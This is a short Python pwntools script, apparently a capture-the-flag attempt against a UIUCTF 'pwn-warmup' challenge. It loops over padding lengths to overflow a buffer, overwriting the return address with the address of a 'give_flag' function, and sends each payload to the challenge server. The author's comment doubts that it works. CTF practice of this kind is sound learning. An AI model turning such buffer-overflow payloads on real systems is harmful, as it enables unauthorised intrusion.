# this prob wont work

from pwn import *

for i in range(50):
    file = ELF("pwn-warmup")
    addr = file.symbols["give_flag"]
    payload = (b'A' * i) + p32(addr)

    rem = remote("chal.uiuc.tf", 2003)
    # rem = process(["./pwn-warmup"])
    rem.sendline(payload)
    print(payload)

    print(rem.recvall())